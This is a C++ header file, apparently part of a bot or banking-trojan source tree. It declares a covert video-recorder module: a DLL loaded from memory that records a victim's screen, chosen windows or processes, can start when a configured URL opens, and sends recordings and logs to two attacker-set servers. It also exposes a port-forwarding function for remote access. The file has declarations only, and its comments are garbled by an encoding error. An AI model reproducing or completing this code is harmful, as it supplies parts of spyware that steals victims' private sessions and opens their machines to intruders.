#ifndef VideoRecorderH
#define VideoRecorderH
//-----------------------------------------------------------------------------

#include <windows.h>
#include "UniversalKeyLogger.h"
#include "DllLoader.h"


// ��������� ��������� ��� �������
#define VIDEOREC_PARAM_SIZE_HOST 50
#define VIDEOREC_PARAM_SIZE_URLS 3000

#define VIDEOREC_PARAM_NAME_HOST1 "VIDEO_REC_HOST1"
#define VIDEOREC_PARAM_NAME_HOST2 "VIDEO_REC_HOST2"
#define VIDEOREC_PARAM_NAME_URLS  "VIDEO_REC_URLS\0"

#define VIDEOREC_PARAM_ENCRYPTED_HOST false
#define VIDEOREC_PARAM_ENCRYPTED_URLS false


// ���� ������� ����� �����
const DWORD VIDEORECORD_DEFAULT_PORT = 700;



static const int VIDEO_FULLSCREEN	= 0x0001; //������������� ������
static const int VIDEO_ALWAYS		= 0x0002; //���������� ������, ���� ���� ���� �� �������


//****************************************************
//  TVideoRecDLL - ����� ��� ������ � �����������
//                 �����������
//****************************************************
class TVideoRecDLL : public TMemoryDLL
{
private:

	// ���������� ���� ������1
	typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd,  const char* ip1, int port1, const char* ip2, int port2, int seconds, int flags ) ;
	typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, const char* ip1, int port1, const char* ip2, int port2, int seconds, int flags );
	typedef VOID (WINAPI *TStopRec		)();
	typedef VOID (WINAPI *TResetTimer	)();

	typedef VOID (WINAPI *TStartSend	)( char* uid, char* path, const char* ip1, int port1, const char* ip2, int port2 );

	//������� ��� �������� ����� �� ������
	typedef int  (WINAPI *TInitSendLog)( char* uid, const char* ip1, int port1, const char* ip2, int port2 );
	typedef void (WINAPI *TReleaseSendLog)();
	typedef void (WINAPI *TSendLog)( const char* name, int code, const char* text );

	//������� ����� ����� ����� ������, uid - �� ����, ip:port - ���� ����� � ����� ����� �������
	//���� ������� ����� ���������� �������� ����� ������. ������� ������� ��������� �����, ������� �����
	//��������� ������
	typedef VOID (WINAPI *TRunPortForward)( const char* uid, const char* ip, int port );

	void InitializeApi();
	void LoadFunc(const char* Name, LPVOID &Addr);
public:
	TVideoRecDLL();
	~TVideoRecDLL();

	TStartRecHwnd		RecordWnd;
	TStartRecPid		RecordProcess;
	TStopRec			Stop;
	TResetTimer			ResetTimer;
	TStartSend			SendData;
	TRunPortForward		RunPortForward;
	TInitSendLog		InitSendLog;
	TReleaseSendLog		ReleaseSendLog;
	TSendLog			SendLog;
};



//****************************************************
//
//****************************************************
class TVideoRecorder : public TBotObject
{
private:
	TVideoRecDLL FDLL;
public:
	string UID;        // ������������� ����
    string VideoName;  // ��� �����
	string Server;     // ����� ��������� ������� �������� �����
	string Server2;    // ����� ���������������� ������� �������� �����
	int    Port;       // ���� ��������� ������� �������� �����
	int    Port2;      // ���� ��������������� ������� �������� �����
	int    RecordTime; // ����� ������, � ��������

	TVideoRecorder();
	~TVideoRecorder();

	void RecordProcess(DWORD PID);
	void RecordCurrentProcess();
	void RecordWnd(HWND Wnd);
	void RecordScreen();
	void ResetTimer();
	void SendFiles(const char *Path);
	void Stop();
};


//����� ��� �������� ����� �� �����-������
class VideoSendLog : public TBotObject
{
		TVideoRecDLL dll;

	public:

		VideoSendLog();
		~VideoSendLog();
		//�������� ���� �� ������:
		//name - ��� ����
		//code - ��� ����
		//format - ��������������� ����� ����
		void Send( const char* name, int code, const char* format, ... );
		void SendV( const char* name, int code, const char* format, va_list va );
		//���� ����� ��� � Send ������ ��� �������������� ������
		void Send2( const char* name, int code, const char* text )
		{
			dll.SendLog( name, code, text );
		}
};

//����� ��� ��������� �������� �����, ��� ������������ ��� ����, ����� �� ������ ��� � ������ �������
class VideoSendLogName : public TBotObject
{
		VideoSendLog& vsl;
		const char* name;

	public:

		VideoSendLogName( VideoSendLog& _vsl, const char* _name ) : vsl(_vsl), name(_name)
		{
		}
		void Send( int code, const char* format, ... );
		void Send2(int code, const char* text )
		{
			vsl.Send2( name, code, text );
		}

};

//������� ���������� ����� ������� ��� ������ �����
PCHAR GetVideoRecHost1();
PCHAR GetVideoRecHost2();
//��������� ������� �����, � ���������� ����������� ���� ����� ������� (���� ������� ����� � �������), ���� ������� ����� 
//���������� �������� ����� ������, ��� ������� ��������� �����-��� � ���� �����-��� ���� ����� �����
//��� ��������, ���������� ��������� �� ����������, ����� ������� ����� �������������
TVideoRecDLL* RunPortForward( const char* ip );
//��������� �����-��� � ��������� �����
bool SaveVideoDll( const char* nameFile );




namespace VideoRecorder
{
	//------------------------------------------------------------
	// RecordProcess - ������� ��������� ����������� �����������
	// ���������� ��������.
	//
	// PID - ������������� ���������� ��������. ���� 0, �� �����
	//       ������� ������ �������� ��������
	//
	// VideoName - ��� �����������
	//------------------------------------------------------------
	void RecordProcess(DWORD PID, const char* VideoName);


	//------------------------------------------------------------
	// RecordWnd - ������� ��������� ������������ ������ ����� �
	// ���������� ����
	//
	// Wnd - ������������� ����
	// VideoName - ��� ������
	//------------------------------------------------------------
    void RecordWnd(HWND Wnd, const char* VideoName);

	//------------------------------------------------------------
	//  ������� ������������� ������
	//------------------------------------------------------------
	void Stop();

	//------------------------------------------------------------
	//  VideoRecorderSendFiles - ������� ���������� ����� ��
	//  ��������� ����� �� ������ �����������.
	//  ��������� ������� ����������.
	//------------------------------------------------------------
	void SendFiles(PCHAR Path);
	void SendFiles(string const &Path);
}



//??????????????????????????????????????????
//���� ���� ������ ���� ��������� ������� � �����, �������� ��� �������� ����������
DWORD WINAPI StartSendinThread(LPVOID Data);


//void WINAPI IEURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data);

void StartVideoFromCurrentURL();




//*********************************************************************
//  ������ ������� ������������� ������ �����
//  ���������� ������� - ������ ����� �������� �� �������
//  ������������������� ��������
//*********************************************************************
namespace VideoRecorderSrv
{
	//-----------------------------------------------------
	// Start - ������� ��������� ������ �������������
	//-----------------------------------------------------
	bool Start();

	//-----------------------------------------------------
	// StartRecording - ������� �������� ������ ������
	//					����� ��� �������� ��������
	//
	// URL - ����� ���� ��� �������� ���������������� ������.
	//-----------------------------------------------------
	bool StartRecording(PCHAR URL);

	//-----------------------------------------------------
	//  StartInfiniteRecording - ������� ���������
	//  ����������� ������ � ������������� ������
	//-----------------------------------------------------
	bool StartInfiniteRecording(const char* VideoName);

	//-----------------------------------------------------
	// StopRecording - ������� ������������� ������ ������
	//					����� ��� �������� ��������
	//-----------------------------------------------------
	bool StopRecording();

	//-----------------------------------------------------
	//  PingClient - ������� ��������� �������� ��
	//               ������ ������ � ��������� PID
	//	���� PID ����� 0 �� ����� ����������� �������
	//  �������
	//-----------------------------------------------------
	bool PingClient(DWORD PID);
}

//-----------------------------------------------------------------------------
#endif
